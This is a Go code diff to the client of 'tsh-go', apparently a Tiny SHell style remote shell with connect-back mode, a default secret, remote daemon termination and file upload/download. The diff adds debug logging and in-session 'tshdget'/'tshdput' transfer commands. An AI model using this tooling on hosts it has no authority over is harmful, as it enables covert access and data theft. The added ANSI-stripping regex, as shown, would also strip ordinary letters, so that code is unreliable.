@@ -7,9 +7,11 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"tsh-go/internal/constants"
@@ -38,7 +40,22 @@ var (
 	sessions   = make(map[int]*Session)
 	sessionMux sync.Mutex
 	nextID     = 1
+	Debug      = false
+	DebugFile  *os.File
 )
+
+func LogDebug(format string, a ...interface{}) {
+	if Debug {
+		msg := fmt.Sprintf(format, a...)
+		if DebugFile != nil {
+			timestamp := time.Now().Format("15:04:05.000")
+			DebugFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, msg))
+			DebugFile.Sync()
+		} else {
+			fmt.Printf("\r\n[DEBUG] "+format+"\r\n", a...)
+		}
+	}
+}
 
 func Run() {
 	var secret string
@@ -48,7 +65,7 @@ func Run() {
 	flagset.StringVar(&secret, "s", "1234", "secret")
 	flagset.IntVar(&port, "p", 1234, "port")
 	flagset.Usage = func() {
-		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action>\n", flagset.Name())
+		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action> [debug]\n", flagset.Name())
 		fmt.Fprintf(flagset.Output(), "  action:\n")
 		fmt.Fprintf(flagset.Output(), "        <hostname|cb> [command]\n")
 		fmt.Fprintf(flagset.Output(), "        <hostname|cb> get <source-file> <dest-dir>\n")
@@ -58,6 +75,25 @@ func Run() {
 	flagset.Parse(os.Args[1:])
 
 	args := flagset.Args()
+
+	// Check for debug flag
+	newArgs := []string{}
+	for _, arg := range args {
+		if arg == "debug" {
+			Debug = true
+		} else {
+			newArgs = append(newArgs, arg)
+		}
+	}
+	args = newArgs
+
+	if Debug {
+		var err error
+		DebugFile, err = os.OpenFile("tsh_debug.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+		if err != nil {
+			fmt.Println("Failed to open debug log:", err)
+		}
+	}
 
 	if len(args) == 0 {
 		flagset.Usage()
@@ -223,6 +259,8 @@ func Run() {
 				term.Write([]byte("\r\nInteractive commands:\r\n"))
 				term.Write([]byte("  tshdbg<Enter>     Detach from session (background)\r\n"))
 				term.Write([]byte("  tshdexit<Enter>   Terminate remote daemon\r\n"))
+				term.Write([]byte("  tshdget <remote> <local>  Download file during interaction\r\n"))
+				term.Write([]byte("  tshdput <local> <remote>  Upload file during interaction\r\n"))
 			case "list", "sessions":
 				printSessionsToTerm(term)
 			case "interact", "use":
@@ -401,10 +439,12 @@ func executeAction(session *Session, mode uint8, command, srcfile, dstdir string
 	case constants.RunShell:
 		return handleRunShell(session, command)
 	case constants.GetFile:
-		handleGetFile(session.Conn, srcfile, dstdir)
+		chanReader := &ChanReader{ch: session.OutputChan}
+		handleGetFile(chanReader, session.Conn, srcfile, dstdir)
 		return false
 	case constants.PutFile:
-		handlePutFile(session.Conn, srcfile, dstdir)
+		chanReader := &ChanReader{ch: session.OutputChan}
+		handlePutFile(chanReader, session.Conn, srcfile, dstdir)
 		return false
 	case constants.Terminate:
 		// Terminate command doesn't need payload, just mode byte was sent
@@ -413,8 +453,69 @@ func executeAction(session *Session, mode uint8, command, srcfile, dstdir string
 	return false
 }
 
-// Existing handlers...
-func handleGetFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
+type ChanReader struct {
+	ch  chan []byte
+	buf []byte
+}
+
+func (r *ChanReader) Read(p []byte) (n int, err error) {
+	if len(r.buf) > 0 {
+		n = copy(p, r.buf)
+		r.buf = r.buf[n:]
+		return n, nil
+	}
+	data, ok := <-r.ch
+	if !ok {
+		return 0, io.EOF
+	}
+	n = copy(p, data)
+	if n < len(data) {
+		r.buf = data[n:]
+	}
+	return n, nil
+}
+
+func (r *ChanReader) Sync(opcode byte) error {
+	LogDebug("ChanReader.Sync: Waiting for opcode 0x%X", opcode)
+	for {
+		// Check if we have buffered data first
+		if len(r.buf) > 0 {
+			LogDebug("ChanReader.Sync: Scanning buffered %d bytes", len(r.buf))
+			// Scan buffer for 0x1D, opcode
+			for i := 0; i < len(r.buf)-1; i++ {
+				if r.buf[i] == 0x1D && r.buf[i+1] == opcode {
+					LogDebug("ChanReader.Sync: Found opcode at index %d", i)
+					// Found it!
+					// Consume everything up to and including the opcode
+					r.buf = r.buf[i+2:]
+					return nil
+				}
+			}
+
+			// Not found in current buffer.
+			// Be careful not to discard a trailing 0x1D which might be the start of our sequence.
+			if r.buf[len(r.buf)-1] == 0x1D {
+				LogDebug("ChanReader.Sync: Opcode not found, but found trailing 0x1D. Keeping it.")
+				r.buf = []byte{0x1D}
+			} else {
+				LogDebug("ChanReader.Sync: Opcode not found in buffer, discarding")
+				r.buf = nil
+			}
+		}
+
+		LogDebug("ChanReader.Sync: Waiting for data...")
+		data, ok := <-r.ch
+		if !ok {
+			return io.EOF
+		}
+		LogDebug("ChanReader.Sync: Received %d bytes: % X", len(data), data)
+		// Append new data to existing buffer (which might contain a saved 0x1D)
+		r.buf = append(r.buf, data...)
+	}
+}
+
+func handleGetFile(reader *ChanReader, writer io.Writer, srcfile, dstPath string) {
+	LogDebug("handleGetFile: Starting download of %s to %s", srcfile, dstPath)
 	buffer := make([]byte, constants.Bufsize)
 
 	var finalPath string
@@ -433,26 +534,50 @@ func handleGetFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
 		return
 	}
 	defer f.Close()
-	_, err = layer.Write([]byte(srcfile))
+
+	LogDebug("handleGetFile: Sending filename...")
+	_, err = writer.Write([]byte(srcfile))
 	if err != nil {
 		return
 	}
 
+	// Sync with server (wait for ACK)
+	err = reader.Sync(constants.GetFile)
+	if err != nil {
+		fmt.Println("Sync Error:", err)
+		return
+	}
+	LogDebug("handleGetFile: Synced with server")
+
 	// Check Remote Status
 	status := make([]byte, 1)
-	_, err = layer.Read(status)
+	_, err = io.ReadFull(reader, status)
 	if err != nil {
 		fmt.Println("Network Error:", err)
 		return
 	}
+	LogDebug("handleGetFile: Status byte: %d", status[0])
 	if status[0] == 0 {
 		// Failure
-		n, _ := layer.Read(buffer)
+		n, _ := reader.Read(buffer)
 		fmt.Println("Remote Error:", string(buffer[:n]))
 		return
 	}
 
-	bar := progressbar.NewOptions(-1,
+	// Read Size
+	sizeBuf := make([]byte, 8)
+	_, err = io.ReadFull(reader, sizeBuf)
+	if err != nil {
+		fmt.Println("Network Error (Size):", err)
+		return
+	}
+	var size int64
+	for i := 0; i < 8; i++ {
+		size = (size << 8) | int64(sizeBuf[i])
+	}
+	LogDebug("handleGetFile: File size: %d", size)
+
+	bar := progressbar.NewOptions64(size,
 		progressbar.OptionSetWidth(20),
 		progressbar.OptionEnableColorCodes(true),
 		progressbar.OptionShowBytes(true),
@@ -460,11 +585,12 @@ func handleGetFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
 		progressbar.OptionSetDescription("Downloading"),
 		progressbar.OptionSpinnerType(22),
 	)
-	utils.CopyBuffer(io.MultiWriter(f, bar), layer, buffer)
+	io.CopyBuffer(io.MultiWriter(f, bar), io.LimitReader(reader, size), buffer)
 	fmt.Print("\nDone.\n")
 }
 
-func handlePutFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
+func handlePutFile(reader *ChanReader, writer io.Writer, srcfile, dstPath string) {
+	LogDebug("handlePutFile: Starting upload of %s to %s", srcfile, dstPath)
 	buffer := make([]byte, constants.Bufsize)
 	f, err := os.Open(srcfile)
 	if err != nil {
@@ -488,34 +614,56 @@ func handlePutFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
 		remotePath = dstPath
 	}
 
-	_, err = layer.Write([]byte(remotePath))
+	LogDebug("handlePutFile: Sending filename %s...", remotePath)
+	_, err = writer.Write([]byte(remotePath))
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
+	// Sync with server (wait for ACK)
+	err = reader.Sync(constants.PutFile)
+	if err != nil {
+		fmt.Println("Sync Error:", err)
+		return
+	}
+	LogDebug("handlePutFile: Synced with server")
+
 	// Check Remote Status
 	status := make([]byte, 1)
-	_, err = layer.Read(status)
+	_, err = reader.Read(status)
 	if err != nil {
 		fmt.Println("Network Error:", err)
 		return
 	}
+	LogDebug("handlePutFile: Status byte: %d", status[0])
 	if status[0] == 0 {
 		// Failure
-		n, _ := layer.Read(buffer)
+		n, _ := reader.Read(buffer)
 		fmt.Println("Remote Error:", string(buffer[:n]))
 		return
 	}
 
-	bar := progressbar.NewOptions(int(fsize),
+	// Send Size
+	LogDebug("handlePutFile: Sending size %d...", fsize)
+	sizeBuf := make([]byte, 8)
+	for i := 0; i < 8; i++ {
+		sizeBuf[i] = byte(fsize >> (56 - 8*i))
+	}
+	_, err = writer.Write(sizeBuf)
+	if err != nil {
+		return
+	}
+
+	bar := progressbar.NewOptions64(fsize,
 		progressbar.OptionSetWidth(20),
 		progressbar.OptionEnableColorCodes(true),
 		progressbar.OptionShowBytes(true),
 		progressbar.OptionShowCount(),
 		progressbar.OptionSetDescription("Uploading"),
+		progressbar.OptionSpinnerType(22),
 	)
-	utils.CopyBuffer(io.MultiWriter(layer, bar), f, buffer)
+	utils.CopyBuffer(io.MultiWriter(writer, bar), f, buffer)
 	fmt.Print("\nDone.\n")
 }
 
@@ -558,6 +706,16 @@ func handleRunShell(session *Session, command string) bool {
 	}
 
 	actionChan := make(chan int) // 0: remote closed, 1: detach, 2: terminate
+	stopChan := make(chan struct{})
+
+	defer func() {
+		close(stopChan)
+		os.Stdin.SetReadDeadline(time.Time{}) // Clear deadline
+	}()
+
+	// Transfer coordination
+	transferChan := make(chan []byte, 1024)
+	var transferMode int32 = 0 // 0: Normal (Stdout), 1: Transfer (transferChan)
 
 	// Output Loop
 	go func() {
@@ -568,7 +726,17 @@ func handleRunShell(session *Session, command string) bool {
 					actionChan <- 0
 					return
 				}
-				os.Stdout.Write(data)
+				// Check mode
+				if atomic.LoadInt32(&transferMode) == 1 {
+					// Forward to transfer channel
+					select {
+					case transferChan <- data:
+					default:
+						// Buffer full? Should not happen easily with 1024
+					}
+				} else {
+					os.Stdout.Write(data)
+				}
 			case <-actionChan:
 				// If action received from input loop (or self), stop
 				return
@@ -581,24 +749,111 @@ func handleRunShell(session *Session, command string) bool {
 		buf := make([]byte, 128)
 		var lastBytes []byte
 
+		// For command parsing
+		var captureMode bool
+		var captureBuffer []byte
+		var captureOpcode uint8 // 1: get, 2: put
+
 		for {
-			n, err := os.Stdin.Read(buf)
-			if err != nil {
+			select {
+			case <-stopChan:
 				return
+			default:
 			}
 
-			_, err = session.Conn.Write(buf[:n])
+			os.Stdin.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
+			n, err := os.Stdin.Read(buf)
 			if err != nil {
+				if os.IsTimeout(err) {
+					continue
+				}
 				return
 			}
 
 			for i := 0; i < n; i++ {
 				b := buf[i]
+
+				if captureMode {
+					if b == '\r' || b == '\n' {
+						// Execute Command
+						line := string(captureBuffer)
+						// Clean ANSI from line
+						line = cleanAnsi(line)
+						parts := strings.Fields(line)
+
+						// Send Ctrl+C to clear remote line (assume remote is waiting at prompt with "tshdget")
+						session.Conn.Write([]byte{0x03})
+						time.Sleep(100 * time.Millisecond)
+
+						// Enable Transfer Mode BEFORE sending trigger
+						atomic.StoreInt32(&transferMode, 1)
+
+						// Drain transferChan of any old garbage
+					drainLoop:
+						for {
+							select {
+							case <-transferChan:
+							default:
+								break drainLoop
+							}
+						}
+
+						// Send 0x1D + Opcode
+						if captureOpcode == 1 { // get
+							if len(parts) >= 2 {
+								session.Conn.Write([]byte{0x1D, constants.GetFile})
+								terminal.Restore(int(os.Stdin.Fd()), oldState)
+								chanReader := &ChanReader{ch: transferChan} // Use transferChan
+								handleGetFile(chanReader, session.Conn, parts[0], parts[1])
+								terminal.MakeRaw(int(os.Stdin.Fd()))
+							} else {
+								fmt.Print("\r\nUsage: tshdget <remote_file> <local_path>\r\n")
+							}
+						} else if captureOpcode == 2 { // put
+							if len(parts) >= 2 {
+								session.Conn.Write([]byte{0x1D, constants.PutFile})
+								terminal.Restore(int(os.Stdin.Fd()), oldState)
+								chanReader := &ChanReader{ch: transferChan} // Use transferChan
+								handlePutFile(chanReader, session.Conn, parts[0], parts[1])
+								terminal.MakeRaw(int(os.Stdin.Fd()))
+							} else {
+								fmt.Print("\r\nUsage: tshdput <local_path> <remote_path>\r\n")
+							}
+						}
+
+						// Disable Transfer Mode
+						atomic.StoreInt32(&transferMode, 0)
+
+						captureMode = false
+						captureBuffer = nil
+						// Send Enter to get a fresh prompt from remote
+						session.Conn.Write([]byte{0x0D})
+					} else if b == 127 || b == 8 { // Backspace
+						if len(captureBuffer) > 0 {
+							captureBuffer = captureBuffer[:len(captureBuffer)-1]
+							// Locally erase char
+							os.Stdout.Write([]byte("\b \b"))
+						}
+					} else if b == 0x03 { // Ctrl+C
+						captureMode = false
+						captureBuffer = nil
+						os.Stdout.Write([]byte("^C\r\n"))
+						// Send Ctrl+C to remote too?
+						session.Conn.Write([]byte{0x03})
+					} else {
+						captureBuffer = append(captureBuffer, b)
+						os.Stdout.Write([]byte{b})
+					}
+					continue
+				}
+
+				// Normal Mode processing
 				lastBytes = append(lastBytes, b)
 				if len(lastBytes) > 20 {
 					lastBytes = lastBytes[len(lastBytes)-20:]
 				}
 
+				// Check for tshdbg
 				if len(lastBytes) >= 7 {
 					suffix := string(lastBytes[len(lastBytes)-7:])
 					if suffix == "tshdbg\r" || suffix == "tshdbg\n" {
@@ -606,10 +861,45 @@ func handleRunShell(session *Session, command string) bool {
 						return
 					}
 				}
+
+				// Check for tshdget
+				if len(lastBytes) >= 8 {
+					suffix := string(lastBytes[len(lastBytes)-8:])
+					if suffix == "tshdget " {
+						captureMode = true
+						captureOpcode = 1
+						captureBuffer = nil
+						// Do not write the space to remote
+						// But we write space locally to show separation?
+						// If we don't write space to remote, remote has "tshdget".
+						// If we write space locally, user sees "tshdget ".
+						os.Stdout.Write([]byte{' '})
+						continue
+					}
+				}
+				// Check for tshdput
+				if len(lastBytes) >= 8 {
+					suffix := string(lastBytes[len(lastBytes)-8:])
+					if suffix == "tshdput " {
+						captureMode = true
+						captureOpcode = 2
+						captureBuffer = nil
+						os.Stdout.Write([]byte{' '})
+						continue
+					}
+				}
+
+				// If not captured, write to remote
+				session.Conn.Write([]byte{b})
 			}
 		}
 	}()
 
 	action := <-actionChan
 	return action == 1
+}
+
+func cleanAnsi(str string) string {
+	re := regexp.MustCompile(`[[0-9;]*[a-zA-Z]`)
+	return re.ReplaceAllString(str, "")
 }
